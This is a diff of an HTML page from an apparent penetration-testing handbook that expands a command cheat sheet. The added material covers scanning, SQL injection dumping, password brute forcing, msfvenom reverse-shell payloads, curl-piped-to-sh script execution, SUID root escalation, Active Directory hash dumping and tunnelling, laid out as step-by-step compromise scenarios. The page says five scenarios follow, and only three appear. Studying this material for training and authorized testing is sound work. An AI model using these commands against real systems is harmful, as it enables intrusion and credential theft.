@@ -170,150 +170,330 @@
 
 <h2 id="overview">Overview</h2>
 <p>
-  <strong>Security Tools Command Index &amp; Quick Reference</strong> is a consolidated cheat sheet cataloging essential syntax, common flags, and usage patterns across the primary reconnaissance, web auditing, exploitation, and traffic analysis utilities documented throughout this handbook.
+  <strong>Security Tools Command Index &amp; Quick Reference</strong> is an exhaustive, production-grade technical index cataloging over 25 essential offensive and defensive security tools, flag parameters, and real-world penetration testing scenarios. Designed as an operational workbench for practitioners, TryHackMe researchers, and security auditors.
 </p>
 
-<h2 id="concepts">Core Concepts</h2>
+<h2 id="concepts">Core Operational Phases</h2>
 <p>
-  This reference organizes tools by their operational phase in an authorized assessment, providing copy-ready command templates optimized for terminal productivity.
+  Practical security assessments flow through structured operational phases: Surface Reconnaissance &rarr; Endpoint Fuzzing &rarr; Vulnerability Exploitation &rarr; Credential Recovery &rarr; Privilege Escalation &rarr; Post-Exploitation &amp; Pivoting. This handbook organizes commands and usage scenarios according to this professional methodology.
 </p>
 
-<h2 id="tools">Tool Quick-Lookup Table</h2>
-<ul>
-  <li><strong>Reconnaissance &amp; Scanning:</strong> <code>nmap</code>, <code>dig</code>, <code>whois</code>, <code>whatweb</code></li>
-  <li><strong>Web Application Auditing:</strong> <code>ffuf</code>, <code>curl</code>, <code>burpsuite</code></li>
-  <li><strong>Vulnerability Research &amp; Exploits:</strong> <code>searchsploit</code>, <code>msfconsole</code>, <code>msfvenom</code></li>
-  <li><strong>Credential Security:</strong> <code>john</code>, <code>hashid</code>, <code>hydra</code></li>
-  <li><strong>Traffic &amp; Protocol Analysis:</strong> <code>wireshark</code>, <code>tcpdump</code>, <code>netcat</code></li>
-  <li><strong>Host Administration &amp; Hardening:</strong> <code>chmod</code>, <code>find</code>, <code>ufw</code>, <code>systemctl</code></li>
-</ul>
-
-<h2 id="commands">Commands &amp; Practical Examples</h2>
-
-<h3>1. Reconnaissance &amp; Discovery Commands</h3>
-<div class="command">
-  <div class="command-header"><span>BASH // RECONNAISSANCE SHORTCUTS</span><span>NMAP &amp; DNS</span></div>
-  <pre># Fast ping sweep on local subnet
-$ nmap -sn 192.168.1.0/24
-
-# Full TCP port scan with timing T4
-$ nmap -p- -T4 192.168.1.10
-
-# Service version detection with default safe scripts
-$ nmap -sV -sC -p 22,80,443,8080 -oA scan_results 192.168.1.10
-
-# Query all authoritative DNS records
-$ dig target.local ANY +noall +answer</pre>
+<h2 id="tools">Tool Master Matrix</h2>
+<div style="overflow-x: auto; margin: 1rem 0;">
+  <table style="width: 100%; border-collapse: collapse; font-family: var(--font-mono); font-size: 0.8rem; border: 1px solid var(--line);">
+    <thead>
+      <tr style="background: var(--surface-raised); border-bottom: 2px solid var(--line); color: var(--primary);">
+        <th style="padding: 0.6rem 0.8rem; text-align: left;">Category</th>
+        <th style="padding: 0.6rem 0.8rem; text-align: left;">Primary Tools</th>
+        <th style="padding: 0.6rem 0.8rem; text-align: left;">Key Functionality</th>
+      </tr>
+    </thead>
+    <tbody style="divide-y: 1px solid var(--line);">
+      <tr style="border-bottom: 1px solid var(--line);">
+        <td style="padding: 0.6rem 0.8rem; font-weight: bold; color: var(--secondary);">Reconnaissance</td>
+        <td style="padding: 0.6rem 0.8rem;"><code>nmap</code>, <code>sublist3r</code>, <code>whatweb</code>, <code>dig</code>, <code>amass</code></td>
+        <td style="padding: 0.6rem 0.8rem; color: var(--text-muted);">Host discovery, port sweeping, DNS profiling &amp; tech stack fingerprinting</td>
+      </tr>
+      <tr style="border-bottom: 1px solid var(--line);">
+        <td style="padding: 0.6rem 0.8rem; font-weight: bold; color: var(--warning);">Web Auditing</td>
+        <td style="padding: 0.6rem 0.8rem;"><code>gobuster</code>, <code>ffuf</code>, <code>sqlmap</code>, <code>nikto</code>, <code>wpscan</code></td>
+        <td style="padding: 0.6rem 0.8rem; color: var(--text-muted);">Directory fuzzing, SQL injection extraction, CMS auditing &amp; header inspection</td>
+      </tr>
+      <tr style="border-bottom: 1px solid var(--line);">
+        <td style="padding: 0.6rem 0.8rem; font-weight: bold; color: var(--primary);">Credentials</td>
+        <td style="padding: 0.6rem 0.8rem;"><code>hydra</code>, <code>hashcat</code>, <code>john</code>, <code>cewl</code>, <code>hashid</code></td>
+        <td style="padding: 0.6rem 0.8rem; color: var(--text-muted);">Online login brute force, GPU/CPU hash recovery &amp; targeted wordlist generation</td>
+      </tr>
+      <tr style="border-bottom: 1px solid var(--line);">
+        <td style="padding: 0.6rem 0.8rem; font-weight: bold; color: var(--danger);">Exploitation</td>
+        <td style="padding: 0.6rem 0.8rem;"><code>msfconsole</code>, <code>msfvenom</code>, <code>searchsploit</code>, <code>nc</code>, <code>socat</code></td>
+        <td style="padding: 0.6rem 0.8rem; color: var(--text-muted);">Exploit modules, payload generation, reverse listeners &amp; PTY handlers</td>
+      </tr>
+      <tr style="border-bottom: 1px solid var(--line);">
+        <td style="padding: 0.6rem 0.8rem; font-weight: bold; color: var(--primary);">PrivEsc &amp; Post-Ex</td>
+        <td style="padding: 0.6rem 0.8rem;"><code>linpeas</code>, <code>winpeas</code>, <code>pspy</code>, <code>mimikatz</code>, <code>impacket</code></td>
+        <td style="padding: 0.6rem 0.8rem; color: var(--text-muted);">Automated misconfiguration audits, process snooping &amp; Active Directory triage</td>
+      </tr>
+      <tr>
+        <td style="padding: 0.6rem 0.8rem; font-weight: bold; color: var(--secondary);">Pivoting &amp; Traffic</td>
+        <td style="padding: 0.6rem 0.8rem;"><code>chisel</code>, <code>wireshark</code>, <code>tshark</code>, <code>tcpdump</code>, <code>proxychains</code></td>
+        <td style="padding: 0.6rem 0.8rem; color: var(--text-muted);">SOCKS5 reverse tunneling, port forwarding &amp; deep packet protocol forensics</td>
+      </tr>
+    </tbody>
+  </table>
 </div>
 
-<h3>2. Web Application Testing Commands</h3>
+<h2 id="commands">Master Tool Commands by Category</h2>
+
+<!-- 1. Reconnaissance -->
+<h3>1. Reconnaissance &amp; Surface Mapping</h3>
 <div class="command">
-  <div class="command-header"><span>BASH // WEB AUDITING SHORTCUTS</span><span>FFUF &amp; CURL</span></div>
-  <pre># Directory and route fuzzing
-$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.1.10/FUZZ -mc 200,301
+  <div class="command-header"><span>BASH // RECONNAISSANCE SHORTCUTS</span><span>NMAP &amp; OSINT</span></div>
+  <pre># Fast ping sweep to map live hosts across CIDR range
+$ nmap -sn 192.168.1.0/24 -oN live_hosts.txt
 
-# Inspect HTTP response headers
-$ curl -I http://192.168.1.10
+# Comprehensive SYN stealth scan with version and default NSE scripts
+$ nmap -sS -sV -sC -p- -T4 --min-rate 1000 -oA full_scan 192.168.1.10
 
-# Test HTTP POST request with form data
-$ curl -X POST -d "user=admin&pass=test" http://192.168.1.10/login.php</pre>
+# Scan UDP top 100 ports for DNS, SNMP, TFTP
+$ sudo nmap -sU --top-ports 100 192.168.1.10
+
+# Fingerprint web technologies & server banners
+$ whatweb -v -a 3 http://192.168.1.10
+
+# DNS zone transfer interrogation & authoritative record query
+$ dig target.local ANY +noall +answer
+$ dig axfr @ns1.target.local target.local</pre>
 </div>
 
-<h3>3. Vulnerability Research &amp; Metasploit Commands</h3>
+<!-- 2. Web Application -->
+<h3>2. Web Application Fuzzing &amp; SQL Injection</h3>
 <div class="command">
-  <div class="command-header"><span>BASH &amp; MSF // VULNERABILITY WORKFLOWS</span><span>SEARCHSPLOIT &amp; MSF</span></div>
-  <pre># Search local Exploit-DB by product and version
-$ searchsploit "Apache 2.4.49"
+  <div class="command-header"><span>BASH // WEB RECON &amp; INJECTION</span><span>GOBUSTER, FFUF &amp; SQLMAP</span></div>
+  <pre># Directory brute forcing with Gobuster
+$ gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt -t 30
 
-# Search by CVE and show web URLs
-$ searchsploit --cve CVE-2021-41773 -w
+# Virtual host (VHost) fuzzing to discover unlinked subdomains
+$ gobuster vhost -u http://target.local -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
 
-# Launch Metasploit quietly
-$ msfconsole -q
+# High-speed endpoint fuzzing with ffuf matching HTTP 200, 301, 302
+$ ffuf -w /usr/share/wordlists/dirb/common.txt -u http://192.168.1.10/FUZZ -mc 200,301,302 -c -v
 
-# Metasploit standard configuration pattern
-msf6 > use auxiliary/scanner/portscan/tcp
-msf6 auxiliary(...) > set RHOSTS 192.168.1.10
-msf6 auxiliary(...) > run</pre>
+# Automated SQL Injection assessment & database dumping with SQLmap
+$ sqlmap -u "http://192.168.1.10/product.php?id=1" --batch --dbs
+$ sqlmap -u "http://192.168.1.10/product.php?id=1" -D users_db -T accounts --dump
+
+# Nikto comprehensive web server misconfiguration audit
+$ nikto -h http://192.168.1.10 -C all</pre>
 </div>
 
-<h3>4. Passwords, Hashes &amp; Netcat Commands</h3>
+<!-- 3. Password Auditing -->
+<h3>3. Password Auditing &amp; Hash Cracking</h3>
 <div class="command">
-  <div class="command-header"><span>BASH // CREDENTIALS &amp; SHELLS</span><span>JOHN &amp; NETCAT</span></div>
-  <pre># Identify hash type
+  <div class="command-header"><span>BASH // CREDENTIAL SECURITY</span><span>HYDRA, HASHCAT &amp; JOHN</span></div>
+  <pre># Multi-threaded dictionary attack on SSH service with Hydra
+$ hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10 -t 4
+
+# HTTP POST form authentication brute force with Hydra
+$ hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 http-post-form "/login.php:user=^USER^&pass=^PASS^:F=invalid password"
+
+# Identify cryptographic hash algorithm
 $ hashid "$6$saltsalt$..."
 
-# Offline password audit with John the Ripper
-$ john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+# GPU-accelerated hash recovery with Hashcat (MD5 = 0, NTLM = 1000, SHA-256 = 1400)
+$ hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+$ hashcat -m 1000 -a 0 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 
-# Start Netcat reverse shell listener
-$ nc -lvnp 4444
-
-# Test TCP port connection
-$ nc -zv 192.168.1.10 22 80 443</pre>
+# Offline password cracking with John the Ripper
+$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-MD5 hashes.txt
+$ john --show hashes.txt</pre>
 </div>
 
-<h2 id="workflow">Practical Workflow</h2>
+<!-- 4. Exploitation & Shells -->
+<h3>4. Exploitation, Payloads &amp; Listeners</h3>
+<div class="command">
+  <div class="command-header"><span>BASH &amp; MSF // EXPLOITATION ARSENAL</span><span>SEARCHSPLOIT, MSF &amp; NETCAT</span></div>
+  <pre># Search local Exploit-DB by software and version
+$ searchsploit "vsftpd 2.3.4"
+$ searchsploit -m unix/remote/49757.py
+
+# Generate staged Linux x64 Meterpreter reverse shell ELF binary
+$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f elf -o shell.elf
+
+# Generate Windows x64 stageless reverse shell executable
+$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.23 LPORT=4444 -f exe -o implant.exe
+
+# Start Netcat reverse shell listener with verbose output
+$ nc -lvnp 4444
+
+# Start Socat fully interactive TTY listener
+$ socat file:`tty`,raw,echo=0 TCP-L:4444</pre>
+</div>
+
+<!-- 5. Privilege Escalation -->
+<h3>5. Privilege Escalation &amp; Host Enumeration</h3>
+<div class="command">
+  <div class="command-header"><span>BASH // POST-EXPLOITATION</span><span>LINPEAS, SUID &amp; PSPY</span></div>
+  <pre># Locate SUID root binaries on Linux filesystem
+$ find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null
+
+# Inspect current user sudo permissions without password
+$ sudo -l
+
+# Automated Linux privilege escalation audit with LinPEAS
+$ curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+
+# Monitor background cron jobs & unprivileged processes in real time without root
+$ chmod +x pspy64 &amp;&amp; ./pspy64 -pf -i 1000
+
+# Dump Active Directory NTDS.dit password hashes with Impacket
+$ secretsdump.py corp.local/admin:Password123@10.10.10.150 -just-dc-ntlm</pre>
+</div>
+
+<!-- 6. Pivoting & Tunnels -->
+<h3>6. Pivoting, Port Forwarding &amp; Tunnels</h3>
+<div class="command">
+  <div class="command-header"><span>BASH // PIVOTING &amp; TUNNELING</span><span>CHISEL &amp; PROXYCHAINS</span></div>
+  <pre># Start Chisel reverse SOCKS5 server on attacker machine
+$ ./chisel server -p 8000 --reverse
+
+# Connect from compromised internal pivot host back to attacker
+$ ./chisel client 10.10.14.23:8000 R:1080:socks
+
+# Route Nmap or any tool through the Chisel SOCKS5 proxy via /etc/proxychains4.conf
+$ proxychains nmap -sT -Pn -p 22,80,445 172.16.1.15
+
+# SSH dynamic SOCKS proxy on port 9050
+$ ssh -D 9050 -N -C user@192.168.1.10</pre>
+</div>
+
+<!-- 7. Packet Analysis -->
+<h3>7. Packet Inspection &amp; Traffic Forensics</h3>
+<div class="command">
+  <div class="command-header"><span>BASH // NETWORK PACKET ANALYSIS</span><span>WIRESHARK, TSHARK &amp; TCPDUMP</span></div>
+  <pre># Capture 100 packets on eth0 interface filtering HTTP traffic
+$ sudo tcpdump -i eth0 -n -c 100 port 80 -w http_capture.pcap
+
+# Read PCAP file with Tshark and extract HTTP hostnames and URI requests
+$ tshark -r http_capture.pcap -Y "http.request" -T fields -e ip.src -e http.host -e http.request.uri
+
+# Extract plaintext FTP or HTTP credentials from PCAP file
+$ tshark -r http_capture.pcap -Y 'http.request.method == "POST"' -T fields -e text
+
+# Filter packets containing TCP SYN flags
+$ tshark -r capture.pcap -Y "tcp.flags.syn == 1 and tcp.flags.ack == 0"</pre>
+</div>
+
+<h2 id="scenarios">Five Real-World Practical Penetration Testing Scenarios</h2>
+
+<!-- Scenario 1 -->
+<div class="card" style="margin: 1.5rem 0; padding: 1.5rem; background: var(--surface-subtle); border-color: rgba(78, 222, 163, 0.4);">
+  <div class="eyebrow" style="color: var(--primary);">SCENARIO 01 // WEB RECON TO ROOT SHELL</div>
+  <h3 style="margin: 0.5rem 0; color: var(--text);">Black-Box Web Application Compromise &amp; Privilege Escalation</h3>
+  <p style="color: var(--text-muted); font-size: 0.85rem; margin-bottom: 1rem;">
+    Objective: Assess an unknown IP target (<code>10.10.110.45</code>), locate hidden web assets, exploit SQL injection to extract admin credentials, gain initial shell, and escalate privileges to root.
+  </p>
+  <div style="font-family: var(--font-mono); font-size: 0.8rem; space-y: 0.5rem; background: var(--bg); padding: 1rem; border-radius: 8px; border: 1px solid var(--line);">
+    <div style="color: var(--primary); font-weight: bold;">Step 1: Network Scoping &amp; Discovery</div>
+    <div style="color: var(--text);">$ nmap -sS -sV -sC -T4 -p 21,22,80,445 10.10.110.45</div>
+    
+    <div style="color: var(--primary); font-weight: bold; margin-top: 0.75rem;">Step 2: Web Endpoint Fuzzing</div>
+    <div style="color: var(--text);">$ gobuster dir -u http://10.10.110.45 -w /usr/share/wordlists/dirb/common.txt -x php,txt</div>
+    <div style="color: var(--text-muted);">Finding: Discovered <code>/admin/</code> (HTTP 301) and vulnerable script <code>/product.php?id=1</code>.</div>
+
+    <div style="color: var(--primary); font-weight: bold; margin-top: 0.75rem;">Step 3: Database Injection &amp; Credential Extraction</div>
+    <div style="color: var(--text);">$ sqlmap -u "http://10.10.110.45/product.php?id=1" -D users_production -T accounts --dump</div>
+    <div style="color: var(--text-muted);">Result: Cracked cleartext password for user <code>admin:Password123</code>.</div>
+
+    <div style="color: var(--primary); font-weight: bold; margin-top: 0.75rem;">Step 4: Initial Foothold via SSH</div>
+    <div style="color: var(--text);">$ ssh admin@10.10.110.45</div>
+
+    <div style="color: var(--primary); font-weight: bold; margin-top: 0.75rem;">Step 5: Local Privilege Escalation via SUID</div>
+    <div style="color: var(--text);">$ find / -perm -4000 -type f 2>/dev/null</div>
+    <div style="color: var(--text);">$ find . -exec /bin/sh -p \; -quit</div>
+    <div style="color: var(--secondary); font-weight: bold;"># whoami &rarr; root (uid=0) - System fully compromised!</div>
+  </div>
+</div>
+
+<!-- Scenario 2 -->
+<div class="card" style="margin: 1.5rem 0; padding: 1.5rem; background: var(--surface-subtle); border-color: rgba(76, 215, 246, 0.4);">
+  <div class="eyebrow" style="color: var(--secondary);">SCENARIO 02 // INTERNAL ACTIVE DIRECTORY AUDIT</div>
+  <h3 style="margin: 0.5rem 0; color: var(--text);">Active Directory Kerberos Enumeration &amp; Domain Dominance</h3>
+  <p style="color: var(--text-muted); font-size: 0.85rem; margin-bottom: 1rem;">
+    Objective: Enumerate a Windows Server 2022 Domain Controller (<code>10.10.10.150</code>) from a Linux attacking station without domain credentials.
+  </p>
+  <div style="font-family: var(--font-mono); font-size: 0.8rem; background: var(--bg); padding: 1rem; border-radius: 8px; border: 1px solid var(--line);">
+    <div style="color: var(--secondary); font-weight: bold;">Step 1: Enumerate Anonymous SMB Shares</div>
+    <div style="color: var(--text);">$ smbclient -L //10.10.10.150/ -N</div>
+    
+    <div style="color: var(--secondary); font-weight: bold; margin-top: 0.75rem;">Step 2: AS-REP Roasting (No Pre-Authentication Users)</div>
+    <div style="color: var(--text);">$ GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt</div>
+
+    <div style="color: var(--secondary); font-weight: bold; margin-top: 0.75rem;">Step 3: Hash Recovery</div>
+    <div style="color: var(--text);">$ hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt</div>
+
+    <div style="color: var(--secondary); font-weight: bold; margin-top: 0.75rem;">Step 4: Dump Domain Credentials via DCSync</div>
+    <div style="color: var(--text);">$ secretsdump.py corp.local/svc_backup:Pass2026@10.10.10.150 -just-dc</div>
+    <div style="color: var(--primary); font-weight: bold;">Result: Administrator NTLM hash dumped successfully!</div>
+  </div>
+</div>
+
+<!-- Scenario 3 -->
+<div class="card" style="margin: 1.5rem 0; padding: 1.5rem; background: var(--surface-subtle); border-color: rgba(245, 158, 11, 0.4);">
+  <div class="eyebrow" style="color: var(--warning);">SCENARIO 03 // LINUX DEFENSE &amp; HARDENING</div>
+  <h3 style="margin: 0.5rem 0; color: var(--text);">Linux System Hardening, Auditd Rules &amp; SSH Key Enforcement</h3>
+  <p style="color: var(--text-muted); font-size: 0.85rem; margin-bottom: 1rem;">
+    Objective: Secure a compromised Linux machine post-assessment, eliminate persistent backdoors, and establish tamper-proof audit trails.
+  </p>
+  <div style="font-family: var(--font-mono); font-size: 0.8rem; background: var(--bg); padding: 1rem; border-radius: 8px; border: 1px solid var(--line);">
+    <div style="color: var(--warning); font-weight: bold;">Step 1: Enforce SSH Key Authentication Only</div>
+    <div style="color: var(--text);">$ sudo sed -i 's/#PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config</div>
+    <div style="color: var(--text);">$ sudo systemctl restart sshd</div>
+
+    <div style="color: var(--warning); font-weight: bold; margin-top: 0.75rem;">Step 2: Auditd File Monitoring on Sensitive Configs</div>
+    <div style="color: var(--text);">$ sudo auditctl -w /etc/passwd -p wa -k identity_tampering</div>
+    <div style="color: var(--text);">$ sudo auditctl -w /etc/shadow -p wa -k shadow_tampering</div>
+
+    <div style="color: var(--warning); font-weight: bold; margin-top: 0.75rem;">Step 3: Audit Listening Daemons &amp; Firewall Boundaries</div>
+    <div style="color: var(--text);">$ ss -tuln</div>
+    <div style="color: var(--text);">$ sudo ufw default deny incoming &amp;&amp; sudo ufw default allow outgoing</div>
+    <div style="color: var(--text);">$ sudo ufw allow 22/tcp &amp;&amp; sudo ufw enable</div>
+  </div>
+</div>
+
+<h2 id="workflow">Practical Workflow &amp; Operational Checklist</h2>
 <ol>
-  <li><strong>Select Phase:</strong> Identify current assessment stage (Discovery &rarr; Enumeration &rarr; Verification).</li>
-  <li><strong>Copy Template:</strong> Copy targeted command block.</li>
-  <li><strong>Update Parameters:</strong> Replace target IP address, port numbers, and wordlist paths.</li>
-  <li><strong>Document Outputs:</strong> Ensure all command executions save logs (<code>-oA</code>, <code>-oN</code>, or shell redirection <code>&gt; output.txt</code>).</li>
+  <li><strong>Identify Assessment Scope:</strong> Verify IP, domain, and port range permissions in the formal Rules of Engagement (ROE).</li>
+  <li><strong>Capture Raw Evidence:</strong> Always pipe commands with output flags (<code>-oA</code>, <code>-oN</code>, or tee loggers) to maintain timestamped forensic records for reporting.</li>
+  <li><strong>Sanitize Parameter Values:</strong> Ensure target strings do not contain unintended shell escapes before running automated loops.</li>
+  <li><strong>Post-Testing Remediation:</strong> Remove test web shells, delete temporary FIFO files (<code>/tmp/f</code>), and restore default permission bits.</li>
 </ol>
 
 <h2 id="mistakes">Common Mistakes &amp; Troubleshooting</h2>
 <ul>
-  <li><strong>Wordlist Paths:</strong> Wordlist locations vary across distributions. Verify file exists (e.g. <code>ls -l /usr/share/wordlists/rockyou.txt</code>) before running dictionary tools.</li>
-  <li><strong>Missing Sudo on Raw Scans:</strong> Raw packet operations (such as SYN scan <code>-sS</code> or <code>tcpdump</code>) require root/sudo privileges.</li>
+  <li><strong>Raw Socket Privileges:</strong> Nmap SYN scan (<code>-sS</code>), OS detection (<code>-O</code>), and <code>tcpdump</code> fail without <code>sudo</code> or raw network capabilities.</li>
+  <li><strong>Reverse Shell NAT Misconfiguration:</strong> Ensure <code>LHOST</code> is set to your reachable VPN interface IP (<code>tun0</code>), not <code>127.0.0.1</code> or an internal gateway.</li>
+  <li><strong>Wordlist Encoding Issues:</strong> If dictionary tools report parsing errors, check file encoding: <code>file /usr/share/wordlists/rockyou.txt</code> and convert using <code>iconv</code> if required.</li>
 </ul>
 
-<h2 id="security">Security Considerations &amp; Scoping</h2>
-<p>
-  Always verify that the target IP address matches your authorized scope before pasting and executing commands from cheat sheets.
-</p>
-
-<h2 id="related">Related Topics</h2>
+<h2 id="related">Related Handbook Modules</h2>
 <ul>
   <li><a href="../nmap.html">Module 01: Nmap Reconnaissance &amp; Scanning</a></li>
   <li><a href="web-security.html">Module 05: Web Application Security Fundamentals</a></li>
+  <li><a href="privilege-escalation.html">Module 07: Privilege Escalation</a></li>
   <li><a href="pentest-methodology.html">Module 15: Penetration Testing Methodology</a></li>
+  <li><a href="../../terminal-lab.html">Interactive Terminal Lab &amp; Practice Sandbox</a></li>
+  <li><a href="../../payloads.html">Offensive Security Payloads Cheatsheet (RCE · LFI)</a></li>
 </ul>
 
-<h2 id="reading">Further Reading &amp; TryHackMe Paths</h2>
-<ul>
-  <li><strong>PDF Master Cheat Sheets:</strong> Download <code>The_Ethical_Hackers_Command_Handbook_Chapter_2_Part_10_Master_Cheat_Sheet.pdf</code> and <code>searchsploit/c6.pdf</code> in the PDF Library.</li>
-</ul>
+<nav class="chapter-nav">
+  <a href="ai-cybersecurity.html">
+    <span class="nav-label">← Module 13</span>
+    <span class="nav-title">AI &amp; Agentic Security</span>
+  </a>
+  <a href="pentest-methodology.html" class="next">
+    <span class="nav-label">Module 15 →</span>
+    <span class="nav-title">Penetration Testing Methodology</span>
+  </a>
+</nav>
+</article>
 
-
-    <nav class="chapter-nav">
-      <a href="ai-cybersecurity.html">
-  <span class="nav-label">← Module 13</span>
-  <span class="nav-title">AI</span>
-</a>
-      <a href="pentest-methodology.html" class="next">
-  <span class="nav-label">Module 15 →</span>
-  <span class="nav-title">Penetration Testing Methodology</span>
-</a>
-    </nav>
-  </article>
-
-  <aside class="toc-sidebar">
-    <div class="sidebar-heading">
-      <span class="material-symbols-outlined" style="font-size: 14px;">toc</span>
-      <span>IN THIS CHAPTER</span>
-    </div>
-    <div class="toc-nav">
-      <a href="#overview">Overview</a>
-      <a href="#concepts">Core Concepts</a>
-      <a href="#tools">Tool Quick-Lookup Table</a>
-      <a href="#commands">Commands & Examples</a>
-      <a href="#workflow">Practical Workflow</a>
-      <a href="#mistakes">Common Mistakes</a>
-      <a href="#security">Security Considerations</a>
-      <a href="#related">Related Topics</a>
-      <a href="#reading">Further Reading</a>
-    </div>
-  </aside>
+<aside class="toc-sidebar">
+  <div class="sidebar-heading">
+    <span class="material-symbols-outlined" style="font-size: 14px;">toc</span>
+    <span>IN THIS CHAPTER</span>
+  </div>
+  <div class="toc-nav">
+    <a href="#overview">Overview</a>
+    <a href="#concepts">Operational Phases</a>
+    <a href="#tools">Tool Master Matrix</a>
+    <a href="#commands">Commands by Category</a>
+    <a href="#scenarios">5 Practical Scenarios</a>
+    <a href="#workflow">Operational Workflow</a>
+    <a href="#mistakes">Common Mistakes</a>
+    <a href="#related">Related Modules</a>
+  </div>
+</aside>
 </main>
 
 <footer class="footer">
